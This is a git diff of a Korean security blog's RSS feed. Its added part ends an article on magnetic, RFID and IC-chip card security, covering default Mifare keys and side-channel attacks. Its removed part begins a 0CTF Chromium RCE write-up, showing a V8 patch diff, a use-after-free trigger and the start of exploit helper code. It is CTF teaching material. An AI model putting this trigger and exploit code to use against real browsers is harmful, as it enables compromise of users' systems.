+    &lt;p&gt;이러한 섹터 중에서 가장 핵심적인 영역이 Sector 0 부분입니다. &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Sector 0의 Block 0&lt;/code&gt;&lt;/strong&gt;의 경우 처음 공장에서 생성될 경우 권한을 다른 섹터 및 블록과 다르게 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Readonly&lt;/code&gt;&lt;/strong&gt;로 되는 것을 원칙으로 하고 있습니다. 따라서 해당 영역은 일반적인 카드에서는 변경이 불가능합니다. 또한 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;네 번째 블록&lt;/code&gt;&lt;/strong&gt;인 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;트레일러(Trailer)&lt;/code&gt;&lt;/strong&gt;의 경우 다음과 같은 형태로 중요 정보를 저장하고 있습니다.&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/202103/sik_8.png&quot; alt=&quot;/assets/202103/sik_8.png&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;트레일러에는 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Key&lt;/code&gt;&lt;/strong&gt;값 A와 B를 저장할 수 있는 공간이 각각 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;6Bytes&lt;/code&gt;&lt;/strong&gt;씩 있고, 그 사이에  &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Access Bits&lt;/code&gt;&lt;/strong&gt;를 지정할 수 있는 공간이 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;4Bytes&lt;/code&gt;&lt;/strong&gt; 있습니다.&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;
+        &lt;p&gt;&lt;strong&gt;Key A&lt;/strong&gt;&lt;/p&gt;
+
+        &lt;p&gt;주로 사용되는 비밀키로써, 암호화 통신에 사용합니다. 해당 Key를 이용하여 인증 후, Sector 내부의 데이터를 확인하게 됩니다.&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;&lt;strong&gt;Key B&lt;/strong&gt;&lt;/p&gt;
+
+        &lt;p&gt;옵션으로 사용되는 공간으로, 필요없을 시 데이터를 입력하여 사용하기도 하는 구역입니다.&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;&lt;strong&gt;Access Bits&lt;/strong&gt;&lt;/p&gt;
+
+        &lt;p&gt;액세스 권한을 정의하며, 6, 7, 8 Byte의 내용에 따라 계산됩니다. 그 구조는 대략 아래와 같습니다.&lt;/p&gt;
+
+        &lt;p&gt;&lt;img src=&quot;/assets/202103/sik_9.png&quot; alt=&quot;/assets/202103/sik_9.png&quot; /&gt;&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;&lt;strong&gt;RFID Tag 기본키 사용 장치 예시&lt;/strong&gt;&lt;/p&gt;
+
+        &lt;p&gt;RFID Tag에 내제된 Key 값이 Default Key인 경우에 대해 다음과 같은 예시가 있습니다.&lt;/p&gt;
+
+        &lt;p&gt;&lt;img src=&quot;/assets/202103/sik_10.png&quot; alt=&quot;/assets/202103/sik_10.png&quot; /&gt;&lt;/p&gt;
+
+        &lt;p&gt;교통카드, 도어락 스마트키, 공카드로 자체제작하는 어떠한 장치 등은 기본적으로 Default Key를 사용하도록 되어 있습니다. 따라서 제공된 Default 키를 이용할 경우 쉽게 정보가 탈취당할 수 있어 유의해야 합니다.&lt;/p&gt;
+
+        &lt;p&gt;이외에도 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Well-known Key&lt;/code&gt;&lt;/strong&gt;와 같이 알려져 있는 키를 사용하는 것 또한 올바르지 않는 설계라고 볼 수 있습니다. &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Mifare Classic Tool&lt;/code&gt;&lt;/strong&gt;이라는 도구에서는 잘 알려진 1081개의 키(Default Key 포함)를 통해 RFID 내의 값을 읽을 수 있는가에 대한 테스트를 해볼 수 있는 안드로이드 앱을 무료로 배포하고 있습니다.&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;strong&gt;RFID Tag 카드 보안성 정리&lt;/strong&gt;
+        &lt;ol&gt;
+          &lt;li&gt;카드 자체 보안성(보통) - Key값을 알지 못하면 불가능&lt;/li&gt;
+          &lt;li&gt;카드 복사 가능성(취약) - 카드 데이터를 알아낼 경우, 쉽게 복사 가능&lt;/li&gt;
+          &lt;li&gt;피해 발생 가능성(보통) - 복사가 이루어질 경우 파급력이 큼&lt;/li&gt;
+        &lt;/ol&gt;
+
+        &lt;p&gt;RFID Tag는 Key 값을 알아내지 못한다면 데이터를 읽을 수 없다는 점에서 어느정도 보안성이 있다고 볼 수 있습니다. 하지만 만약 태그 내의 데이터를 알아낼 경우, 복사 자체는 어렵지 않습니다. 이러한 이유로, RFID Tag 보안에 대해 일부는 Side Channel Attack을 이용하여 공격을 수행하기도 합니다.&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;&lt;strong&gt;RFID Tag Side Channel Attack 예시&lt;/strong&gt;&lt;/p&gt;
+
+        &lt;p&gt;&lt;a href=&quot;https://thehackernews.com/2021/02/new-hack-lets-attackers-bypass.html?utm_source=feedburner&amp;amp;utm_medium=feed&amp;amp;utm_campaign=Feed%3A+TheHackersNews+%28The+Hackers+News+-+Cyber+Security+Blog%29&amp;amp;m=1&quot;&gt;New Hack Lets Attackers Bypass MasterCard PIN by Using Them As Visa Card&lt;/a&gt;&lt;/p&gt;
+
+        &lt;p&gt;RFID Tag에 대해 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Side Channel Attack&lt;/code&gt;&lt;/strong&gt;의 예시는 다음과 같습니다. 해당 링크에서 나오는 내용을 요약하면 MITM 공격으로 RFID 결제를 우회할 수 있는 공격입니다. 두 개의 스마트폰 사이에서 WiFi를 통해 연결 후, APDU 명령어를 통해 공격하는 내용을 말하고 있습니다.&lt;/p&gt;
+
+        &lt;p&gt;&lt;img src=&quot;/assets/202103/sik_11.png&quot; alt=&quot;/assets/202103/sik_11.png&quot; /&gt;&lt;/p&gt;
+
+        &lt;p&gt;&lt;img src=&quot;/assets/202103/sik_12.png&quot; alt=&quot;/assets/202103/sik_12.png&quot; /&gt;&lt;/p&gt;
+
+        &lt;p&gt;관련 논문은 링크로 남겨드리도록 하겠습니다.&lt;/p&gt;
+
+        &lt;p&gt;&lt;a href=&quot;https://jorgetp.github.io/assets/files/papers/USENIX21.pdf&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+        &lt;p&gt;&lt;a href=&quot;https://arxiv.org/pdf/2006.08249.pdf&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;3-ic-chip&quot;&gt;3. IC Chip&lt;/h2&gt;
+
+&lt;p&gt;IC Chip을 이용한 결제 방식은 접촉식과 비접촉식으로 나누어져 있다고 합니다. 하지만 여기서는 접촉식 IC Chip에 대한 보안성과 카드복사 가능성에 대해 다루어보려고 합니다.&lt;/p&gt;
+
+&lt;p&gt;IC Chip은 Integrated Circuit Chip의 약자로써, 집적 회로(Integrated Circuit)를 이용하여 특정 대상을 식별할 수 있는 기술을 말합니다. 흔히 신용카드나 체크카드에 붙어있는 금색 칩을 보셨을 것입니다. 이러한 칩은 다음과 같이 이루어져 있습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/202103/sik_13.png&quot; alt=&quot;/assets/202103/sik_13.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;IC Chip 혹은 Smart Chip이라고도 불리며, 이러한 칩의 구성은 CPU와 RAM, ROM(혹은 OS, EEPROM 등)으로 이루어져 있으며, 자체적인 암호화 모듈(Encryption Module)도 함께 내장되어 있기도 합니다. 이러한 칩 내부에는 하드웨어 및 Card OS와 같은 운영체제로 동작하는 부분과 Java Card Platform과 같은 SW 규격을 맞춘 데이터가 내포되어 있습니다. 이는 카드 자체의 연산 능력이 있다는 것을 말합니다.&lt;/p&gt;
+
+&lt;p&gt;신용카드의 경우 EMV(EuroPay-MasterCard-Visa)의 포맷에 맞추어 개발되며, 암호화 키 및 PIN 번호를 활용하여 결제를 가능하도록 합니다. 이러한 EMV 내부에서도 각 국가마다 이해관계가 달라서 다음과 같은 차이를 가지기도 합니다.&lt;/p&gt;
+
+&lt;p&gt;유럽의 경우 카드를 꽂고 PIN 번호를 입력해야 결제가 가능(해외에 신용카드 가지고 나갈 시, PIN 번호 발급이 필수)
+한국과 미국의 경우 카드만 꽂아도 결제가 가능(PIN Bypass 모드 사용)&lt;/p&gt;
+
+&lt;p&gt;IC Chip의 보안적 특징은 암호화된 카드는 처음 만들어진 공개키 암호화 인증서를 이용하여 암호문을 생성하고, 정상적인 암호인지 확인할 수 있는 장치를 마련해두었습니다. 이렇게 생성된 암호문은 항상 일정하지 않고 매 결재 시 마다 변경되며, 암호화된 코드는 겹치지 않도록 설계되었습니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;IC 카드 거래에 사용된 암호화 기술&lt;/strong&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;https://hack-gogumang.tistory.com/569&quot;&gt;금융부문 암호기술 - (2) IC카드 거래에 사용된 암호화 기술&lt;/a&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/202103/sik_14.png&quot; alt=&quot;/assets/202103/sik_14.png&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;SDA 인증절차는 IC 단말기가 CA 공개키를 통해 IC 카드에 저장된 발급사 공개키 인증서를 검증하는 절차입니다. 이때 IC 카드 내에는 서명된 SAD(정적 어플리케이션 데이터)를 저장해야 하고, 또한 발급사의 공개키 인증서를 저장해야 합니다.&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/202103/sik_15.png&quot; alt=&quot;/assets/202103/sik_15.png&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;DDA 인증절차는 IC 카드 내부에서 동적으로 생성된 동적 어플리케이션 데이터(DAD)의 유효성을 계속해서 검증하는 절차를 말합니다. IC Chip 내부에서 계속해서 변하는 암호문 데이터를 결제 시마다 검증하여 보안성을 높이는 절차입니다.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;IC Chip 카드 보안성 정리&lt;/strong&gt;
+    &lt;ol&gt;
+      &lt;li&gt;카드 자체 보안성(안전) - 자체 내장된 보안기법을 통해 Key값을 알아내더라고 공격이 어려움&lt;/li&gt;
+      &lt;li&gt;카드 복사 가능성(안전) - 카드내의 데이터를 읽는 것이 이론상 불가능하며, 읽더라도 카드 자체를 복사하는 것은 불가능함&lt;/li&gt;
+      &lt;li&gt;피해 발생 가능성(안전) - 복사 자체가 어렵고 복사하더라도 신용카드로써 이용하는 것이 불가능함&lt;/li&gt;
+    &lt;/ol&gt;
+
+    &lt;p&gt;IC Chip은 자체적인 보안기법과 IC Chip 내에서 이루어지는 암호화 연산 능력 때문에 사실상 이론적으로 복사가 불가능한 것으로 알려져 있습니다. 또한 이러한 보안 솔루션을 우회하기 위해서는 RFID Tag와 마찬가지로 Side Channel Attack류의 공격으로 우회가 가능한데, 이러한 공격도 신용카드를 우회하는 공격은 아직까지 알려진 바가 없습니다. 따라서 앞서 연구한 세 가지 카드 중에서 가장 안전한 카드 결제 방식으로 보입니다.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;IC Chip Side Channel Attack 예시&lt;/strong&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/docs/asia-17/materials/asia-17-Kim-Breaking-Korea-Transit-Card-With-Side-Channel-Attack-Unauthorized-Recharging-wp.pdf&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+    &lt;p&gt;해당 연구는 충전용 카드에 있는 IC Chip을 우회하여, 충전되어 있는 카드의 내역을 조작하는 내용입니다. 내용을 요약하여 설명드리자면, IC Chip을 통해 통신하는 내용을 오실로스코프를 통해 주파수를 잡아 이를 통해 IC Chip 내부의 값을 조작하는 것으로 기존에 충전되어 있는 금액을 조작합니다. 자세한 내용은 유튜브와 Blackhat에서 발표한 PDF 파일을 참조해주기 바랍니다.&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/assets/202103/sik_16.png&quot; alt=&quot;/assets/202103/sik_16.png&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?t=882&amp;amp;v=3_ojBHBvF9s&amp;amp;feature=youtu.be&amp;amp;ab_channel=BlackHat&quot;&gt;Breaking Korea Transit Card with Side-Channel Attack - Unauthorized Recharging&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;4-결론&quot;&gt;4. 결론&lt;/h2&gt;
+
+&lt;p&gt;카드 결제 및 카드 복사 관련하여 각각의 기술이 어느정도 취약한지에 대해 연구해보았습니다. 마그네틱 카드는 보안성을 고려하지 않은 상태로 설계되어 특정 도구 및 장비만 있다면 어렵지 않게 읽고 쓰기가 가능하며, 정보만 알고 있다면 쉽게 복사가 가능한 것으로 나타났습니다. 그러나 이후에 보안성을 고려한 두 가지 기법으로 RFID와 IC Chip은 보다 안전한 사용이 가능할 것으로 판단됩니다.&lt;/p&gt;
+
+&lt;p&gt;먼저 RFID의 경우, 내장된 6Bytes 키로 인해 적절한 인증이 이루어지지 않으면 카드를 읽을 수 없도록 설계되어있습니다. 일반적인 방법으로 전수공격(Bruteforce Attack)을 수행할 경우 인증 키를 탈취하는 것은 어렵습니다. 그러나 해당 Key를 알아낼 수 있다면, 복사 자체는 어렵지 않는 것으로 판단됩니다. 그외의 카드 복사가 아닌 타인의 카드를 사용할 수 있도록 Side Channel Attack 또한 활발히 연구되는 것으로 알려져 있어, 보안성 자체는 마그네틱 카드보다는 우수하나 IC Chip보다는 부족한 것으로 보입니다.&lt;/p&gt;
+
+&lt;p&gt;마지막으로 IC Chip의 경우, 내장되어 있는 공개키, 서명된 값 등을 통해 안전한 통신 및 식별 과정이 이루어지기 때문에 앞서 연구한 두 카드보다 월등한 보안성을 가지고 있습니다. 이론적으로 IC Chip 내부의 데이터를 읽고 복사하는 것은 불가능하며, 암호 인증 체계 또한 우회하기 어렵도록 되어있습니다.&lt;/p&gt;
+
+&lt;p&gt;위의 연구한 세 가지 카드 결제 방식에 대해 보안성과 복사 가능성 등을 연구해보았고, 이를 통해 안전한 결제 방식과 안전한 결제를 위해 필요한 보안성에 대해 알아보았습니다.&lt;/p&gt;
+</description>
+        <pubDate>Mon, 01 Mar 2021 00:00:00 +0000</pubDate>
+        <link>http://202.182.127.225:4000/2021-03-01/Magnetic</link>
+        <guid isPermaLink="true">http://202.182.127.225:4000/2021-03-01/Magnetic</guid>
+        
+        <category>hardware</category>
+        
+        <category>research</category>
+        
+        
+      </item>
     
       <item>
         <title>Chrome EME (MediaSession) - 1</title>
@@ -718,7 +1131,9 @@
         <link>http://202.182.127.225:4000/2021-02-01/Chrome-EME</link>
         <guid isPermaLink="true">http://202.182.127.225:4000/2021-02-01/Chrome-EME</guid>
         
-        <category>research</category>
+        <category>analysis</category>
+        
+        <category>drm</category>
         
         
       </item>
@@ -13547,636 +13962,6 @@ const parsed2 = new UrlParse(url)
         <category>ctf</category>
         
         <category>web</category>
-        
-        
-      </item>
-    
-      <item>
-        <title>0ctf Chromium RCE/SBX WriteUp</title>
-        <description>&lt;p&gt;라온화이트햇 핵심연구팀 이영주&lt;/p&gt;
-
-&lt;h1 id=&quot;1-intro&quot;&gt;1. Intro&lt;/h1&gt;
-
-&lt;p&gt;6월 27일부터 29일까지 진행되었던 0CTF 문제중 Chromium RCE, Chromium SBX 문제에 대한 WriteUp입니다. 두 문제는 가장 빠르게 해결하여 퍼블을 먹었습니다.&lt;/p&gt;
-
-&lt;h1 id=&quot;2-rce--vulnerability&quot;&gt;2. RCE : Vulnerability&lt;/h1&gt;
-
-&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
-index b5c9dcb261..babe7da3f0 100644
-&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/src/builtins/typed-array-set.tq
-&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/src/builtins/typed-array-set.tq
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -70,7 +70,7 @@&lt;/span&gt; TypedArrayPrototypeSet(
-     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
-     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
-     //   exception.
-&lt;span class=&quot;gd&quot;&gt;-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
-&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+    const utarget = %RawDownCast&amp;lt;AttachedJSTypedArray&amp;gt;(target);
-&lt;/span&gt;
-     const overloadedArg = arguments[0];
-     try {
-&lt;span class=&quot;p&quot;&gt;@@ -86,8 +86,7 @@&lt;/span&gt; TypedArrayPrototypeSet(
-       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
-       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
-       //   exception.
-&lt;span class=&quot;gd&quot;&gt;-      const utypedArray =
--          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
-&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+      const utypedArray = %RawDownCast&amp;lt;AttachedJSTypedArray&amp;gt;(typedArray);
-&lt;/span&gt;
-       TypedArrayPrototypeSetTypedArray(
-           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;핵심적인 diff 코드는 위와 같습니다. 패치는 TypedArrayPrototypeSet 함수에서 되었으며 함수 중간에 detached된 array buffer를 z검사하는 루틴이 제거되었습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
-index 3519599a88..f1ba0fb445 100644
-&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/src/parsing/parser-base.h
-&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/src/parsing/parser-base.h
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -1907,10 +1907,8 @@&lt;/span&gt; ParserBase&amp;lt;Impl&amp;gt;::ParsePrimaryExpression() {
-       return ParseTemplateLiteral(impl()-&amp;gt;NullExpression(), beg_pos, false);
-
-     case Token::MOD:
-&lt;span class=&quot;gd&quot;&gt;-      if (flags().allow_natives_syntax() || extension_ != nullptr) {
--        return ParseV8Intrinsic();
--      }
--      break;
-&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+      // Directly call %ArrayBufferDetach without `--allow-native-syntax` flag
-+      return ParseV8Intrinsic();
-&lt;/span&gt;
-     default:
-       break;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;또한 d8에서 arraybuffer를 바로 detach 할 수 있도록 위 함수 내용이 추가되었습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;t2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ArrayBufferDetach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;취약점은 위 코드로 트리거할 수 있습니다. t1의 버퍼를 t2로 복사하는 과정에서 t1의 버퍼를 detach하게 되면 free된 내용의 값이 t2로 복사됩니다.&lt;/p&gt;
-
-&lt;h1 id=&quot;3-rce--exploit&quot;&gt;3. RCE : Exploit&lt;/h1&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;convert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Float64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Uint32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;d2u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;f64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u2d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;d2u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
